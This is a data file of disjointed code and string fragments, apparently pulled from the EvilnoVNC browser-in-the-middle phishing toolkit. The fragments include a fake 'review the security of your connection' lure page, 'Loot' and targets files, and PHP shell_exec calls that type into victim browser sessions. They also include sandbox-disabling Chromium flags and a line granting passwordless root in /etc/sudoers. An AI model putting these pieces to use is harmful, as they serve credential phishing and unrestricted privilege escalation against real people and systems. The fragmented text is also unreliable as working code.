"(' ', ""'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"")"
"(' ', '""<td id=\'bar0\' style=\'width: $idle_p%\'>$idle_cnt ($idle_p %)</td>""; ?>')"
"(' ', '""<td id=\'bar1\' style=\'width: $click_p%\'>$clicksubm ($click_p %)</td>""; ?>')"
"(' ', '""<td id=\'bar2\' style=\'width: $auth_p%\'>$auth_cnt ($auth_p %)</td>""; ?>')"
"(' ', '""Error, missing parameters:""')"
"(' ', '""Error: getting server state"";')"
"(' ', '""Error: getting state of all servers"";')"
"(' ', '""EvilnoVNC/tmp/*""')"
"(' ', '""Loot/*""')"
"(' ', '""[!] Could not read state file."";')"
"(' ', '""[!] bash missing as dependency, exiting""; exit 1; }')"
"(' ', '""[!] docker missing as dependency, exiting""; exit 1; }')"
"(' ', '""[!] realpath missing as dependency, exiting""; exit 1; }')"
"(' ', '""[*] Error while sending block to controller"";                                                                                                                                                                            ')"
"(' ', '""[*] successfully sent block to controller"";                                                                                                                                                                              ')"
"(' ', '""accesslog.txt""')"
"(' ', '""blacklist.acl""')"
"(' ', '""submitlog.txt""')"
"(' ', '""targets.json""')"
"(' ', '""user:false"" | chpasswd && \\')"
"(' ', '""whitelist.acl""')"
"(' ', '$cfg')"
"(' ', '$dash1')"
"(' ', '$dash2')"
"(' ', '$erun')"
"(' ', '$hrun')"
"(' ', '-e ""\\t $0 (<custom-URL>) <instance-number>""')"
"(' ', '-e ""\\t e.g. $0 01""')"
"(' ', '-e ""\\t or $0 \\""https://target.com\\"" 01""')"
"(' ', '-e ""\\t\\t custom-URL is optional, see setup.sh""')"
"(' ', '-n \'\' > /etc/submitlog.txt"");')"
"(' ', './$run')"
"(' ', '\'$reqid\' >> /etc/blacklist.acl"");')"
"(' ', '\'CHROMIUM_FLAGS=""--window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors --guest""\' >> /etc/chromium/chromium.conf')"
"(' ', '\'CHROMIUM_FLAGS=""--window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-sandbox --password-store=basic --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors --auto-open-devtools-for-tabs --guest""\' >> /etc/chromium/chromium.conf')"
"(' ', 'statt cat, nur resolution.txt')"
"('\n', '""URL=$WEBPAGE"" > php.ini')"
"('\n', '""[*] Check state with screen -ls, reattach with screen -r <name>""')"
"('\n', '""[*] EvilnoVNC instances started, pointing to $url""')"
"('\n', '""[*] If there were no errors, you are ready to go! --> ./run.sh""')"
"('\n', '""[*] Starting $instances EvilnoVNC instances...""')"
"('\n', '""[*] Starting controller in screen session...""')"
"('\n', '""[*] Starting controller...""')"
"('\n', '""[*] Starting haproxy in screen session...""')"
"('\n', '""[*] Starting haproxy...""')"
"('\n', '$URL; ?> needs to review the security of your connection before proceeding.')"
"('\n', '$URL; ?></h1>')"
"('\n', 'shell_exec(""docker exec evil$sid xdotool type \\""$v\\"""");')"
"('\t', '""</div>"" . PHP_EOL;')"
"('\t', '""</table>"" . PHP_EOL;')"
"('\t', '""</td>"" . PHP_EOL;')"
"('\t', '""</textarea>"";')"
"('\t', '""</tr>"" . PHP_EOL;')"
"('\t', '""<div class=\'instances$connected\'>')"
